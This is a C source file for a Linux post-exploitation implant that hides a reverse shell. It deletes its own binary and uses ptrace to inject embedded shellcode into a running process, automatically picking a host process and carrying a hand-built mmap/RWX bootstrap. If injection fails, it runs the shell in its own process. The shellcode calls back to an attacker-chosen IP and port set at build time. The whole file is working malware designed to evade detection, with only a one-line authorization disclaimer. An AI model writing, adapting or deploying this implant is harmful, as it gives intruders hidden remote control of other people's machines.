/*
 * implant.c - single-binary hidden reverse shell.
 *
 * Built by make_shell.py, which embeds the x86-64 revshell bytes as sc.h.
 * When run on a pwned target:
 *   1. unlinks itself via /proc/self/exe - nothing is left on disk;
 *   2. injects the shellcode into an existing process (--pid/--name, or an
 *      auto-picked host) so the reverse shell lives inside an already-running
 *      PID - no new process appears in the list;
 *   3. if injection is unavailable (no ptrace access, e.g. yama ptrace_scope
 *      on, or no executable region), falls back to running the shellcode in
 *      its own process - the same behavior as the plain minimal revshell.
 *
 * The shellcode execve()s /bin/sh, so the host PID is replaced in place
 * (same PID; its comm becomes "sh"). An execve never adds a PID.
 *
 * Build (dynamic, lightweight):
 *   python3 make_shell.py <IP> <PORT> <NAME> -o shell
 *
 * Use only on systems and CTF targets where you have authorization.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <signal.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>

#include "sc.h"

/* ---------------- self-delete ---------------- */

static void self_delete(void)
{
    char path[4096];
    ssize_t n = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (n > 0) {
        path[n] = '\0';
        unlink(path);
    }
}

/* ---------------- ptrace injection ---------------- */

static int find_region(pid_t pid, uintptr_t *addr, size_t *len, int want_rwx)
{
    char path[64], line[512];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    FILE *f = fopen(path, "r");
    if (!f)
        return -1;
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        unsigned long long start, end;
        char perms[8] = {0};
        if (sscanf(line, "%llx-%llx %7s", &start, &end, perms) != 3)
            continue;
        if (want_rwx ? strncmp(perms, "rwxp", 4) == 0
                     : strncmp(perms, "r-xp", 4) == 0) {
            *addr = (uintptr_t)start;
            *len = (size_t)(end - start);
            found = 1;
            break;
        }
    }
    fclose(f);
    return found ? 0 : -1;
}

/*
 * x86-64 bootstrap for targets without an RWX page: mmap(RWX), copy the
 * payload out of the executable region, jump to it. Same layout as memexec.
 */
static uint8_t *build_blob(size_t sc_len, size_t *blob_len)
{
    static const uint8_t skel[62] = {
        0x45, 0x31, 0xC0, 0x49, 0xFF, 0xC8, 0x45, 0x31, 0xC9, 0x31, 0xFF,
        0xBE, 0x00, 0x00, 0x00, 0x00,
        0xBA, 0x07, 0x00, 0x00, 0x00,
        0x41, 0xBA, 0x22, 0x00, 0x00, 0x00,
        0xB8, 0x09, 0x00, 0x00, 0x00,
        0x0F, 0x05,
        0x48, 0x85, 0xC0,
        0x78, 0x16,
        0x48, 0x89, 0xC3,
        0x48, 0x8D, 0x35, 0x0D, 0x00, 0x00, 0x00,
        0x48, 0x89, 0xDF,
        0xB9, 0x00, 0x00, 0x00, 0x00,
        0xF3, 0xA4,
        0xFF, 0xE3,
        0xC3,
    };
    if (sc_len > UINT32_MAX - 64)
        return NULL;

    /* [ EB 00 ][ skel ][ payload ] - the shim handles syscall-restart RIP-2 */
    size_t total = 64 + sc_len;
    uint8_t *blob = calloc(1, total);
    if (!blob)
        return NULL;
    blob[0] = 0xEB;
    blob[1] = 0x00;
    memcpy(blob + 2, skel, 62);
    memcpy(blob + 64, sc, sc_len);

    uint32_t v;
    v = (uint32_t)total;
    memcpy(blob + 2 + 0x0c, &v, 4);
    v = (uint32_t)sc_len;
    memcpy(blob + 2 + 0x35, &v, 4);

    *blob_len = total;
    return blob;
}

static int poke(pid_t pid, uintptr_t at, const uint8_t *data, size_t len)
{
    for (size_t off = 0; off < len; off += sizeof(uintptr_t)) {
        size_t chunk = len - off;
        if (chunk > sizeof(uintptr_t))
            chunk = sizeof(uintptr_t);
        uintptr_t word = 0;
        memcpy(&word, data + off, chunk);
        if (ptrace(PTRACE_POKETEXT, pid, (void *)(at + off), (void *)word) != 0)
            return -1;
    }
    return 0;
}

static int inject(pid_t pid, size_t sc_len)
{
    uintptr_t at;
    size_t region_len;
    int use_rwx = (find_region(pid, &at, &region_len, 1) == 0);
    if (!use_rwx && find_region(pid, &at, &region_len, 0) != 0)
        return -1;

    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) != 0)
        return -1;
    int status;
    waitpid(pid, &status, 0);

    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    if (use_rwx) {
        size_t pad = sc_len + 2;
        if (pad > region_len) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        uint8_t *tmp = malloc(pad);
        if (!tmp) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        tmp[0] = 0xEB;
        tmp[1] = 0x00;
        memcpy(tmp + 2, sc, sc_len);
        int ok = poke(pid, at, tmp, pad);
        free(tmp);
        if (ok != 0) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        regs.rip = (unsigned long long)at + 2;
    } else {
        size_t blob_len = 0;
        uint8_t *blob = build_blob(sc_len, &blob_len);
        if (!blob) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        if (blob_len > region_len) {
            free(blob);
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        int ok = poke(pid, at, blob, blob_len);
        free(blob);
        if (ok != 0) {
            ptrace(PTRACE_DETACH, pid, NULL, NULL);
            return -1;
        }
        regs.rip = (unsigned long long)at + 2;
    }

    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
        return -1;
    }

    /* resume, interrupt any blocking syscall, then detach */
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    usleep(20000);
    kill(pid, SIGCONT);
    usleep(150000);
    ptrace(PTRACE_INTERRUPT, pid, NULL, NULL);
    waitpid(pid, NULL, 0);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}

/* ---------------- target selection ---------------- */

static const char *skip_names[] = {
    "sh", "bash", "dash", "zsh", "ksh", "fish", "mksh",
    "init", "systemd", "kthreadd", NULL
};

static int skip_name(const char *comm)
{
    for (int i = 0; skip_names[i]; i++)
        if (strcmp(comm, skip_names[i]) == 0)
            return 1;
    return 0;
}

static int proc_uid(pid_t pid, uid_t *uid)
{
    char path[64], line[256];
    snprintf(path, sizeof(path), "/proc/%d/status", pid);
    FILE *f = fopen(path, "r");
    if (!f)
        return -1;
    int ok = -1;
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "Uid:", 4) == 0) {
            unsigned int u;
            if (sscanf(line, "Uid: %u", &u) == 1) {
                *uid = (uid_t)u;
                ok = 0;
            }
            break;
        }
    }
    fclose(f);
    return ok;
}

static int proc_comm(pid_t pid, char *comm, size_t len)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", pid);
    FILE *f = fopen(path, "r");
    if (!f)
        return -1;
    if (!fgets(comm, (int)len, f)) {
        fclose(f);
        return -1;
    }
    fclose(f);
    comm[strcspn(comm, "\n")] = 0;
    return 0;
}

/* Gather candidate host PIDs (same uid, not self/parent/shell), sorted. */
static size_t pick_targets(pid_t self, pid_t parent, pid_t *out, size_t cap)
{
    DIR *d = opendir("/proc");
    if (!d)
        return 0;
    uid_t me = getuid();
    struct dirent *e;
    size_t n = 0;
    while ((e = readdir(d)) && n < cap) {
        if (!isdigit((unsigned char)e->d_name[0]))
            continue;
        pid_t pid = atoi(e->d_name);
        if (pid <= 2 || pid == self || pid == parent)
            continue;
        uid_t u;
        if (proc_uid(pid, &u) != 0 || u != me)
            continue;
        char comm[64];
        if (proc_comm(pid, comm, sizeof(comm)) != 0)
            continue;
        if (skip_name(comm))
            continue;
        out[n++] = pid;
    }
    closedir(d);
    for (size_t i = 0; i < n; i++)
        for (size_t j = i + 1; j < n; j++)
            if (out[j] < out[i]) {
                pid_t t = out[i];
                out[i] = out[j];
                out[j] = t;
            }
    return n;
}

static pid_t find_pid_by_name(const char *name)
{
    DIR *d = opendir("/proc");
    if (!d)
        return 0;
    struct dirent *e;
    pid_t found = 0;
    while ((e = readdir(d))) {
        if (!isdigit((unsigned char)e->d_name[0]))
            continue;
        pid_t pid = atoi(e->d_name);
        char comm[64];
        if (proc_comm(pid, comm, sizeof(comm)) != 0)
            continue;
        if (strcmp(comm, name) == 0) {
            found = pid;
            break;
        }
    }
    closedir(d);
    return found;
}

/* ---------------- fallback: run in place ---------------- */

static void run_self(void)
{
    void *p = mmap(NULL, sc_len, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED)
        return;
    memcpy(p, sc, sc_len);
    if (mprotect(p, sc_len, PROT_READ | PROT_EXEC) != 0)
        return;
    pthread_t th;
    if (pthread_create(&th, NULL, (void *(*)(void *))p, NULL) != 0)
        return;
    for (;;)
        pause();   /* the shellcode execve()s; this becomes the shell */
}

/* ---------------- entry ---------------- */

int main(int argc, char **argv)
{
    pid_t want_pid = 0;
    const char *want_name = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--pid") == 0 && i + 1 < argc)
            want_pid = (pid_t)strtoul(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "--name") == 0 && i + 1 < argc)
            want_name = argv[++i];
        /* any other args are ignored: `./shell` works with none */
    }

    self_delete();   /* remove the file before anything else */

    if (want_name)
        want_pid = find_pid_by_name(want_name);

    if (want_pid) {
        if (inject(want_pid, sc_len) == 0)
            return 0;   /* shell now lives inside that PID; we exit */
        fprintf(stderr, "implant: inject into %d failed; running in place\n", want_pid);
    } else {
        pid_t self = getpid(), parent = getppid();
        pid_t cands[8];
        size_t nc = pick_targets(self, parent, cands, 8);
        for (size_t i = 0; i < nc; i++)
            if (inject(cands[i], sc_len) == 0)
                return 0;   /* hosted in an existing process, no new PID */
        if (nc)
            fprintf(stderr, "implant: inject into %zu host candidate(s) failed; running in place\n", nc);
    }

    run_self();   /* fallback: this process becomes the shell */
    return 0;
}
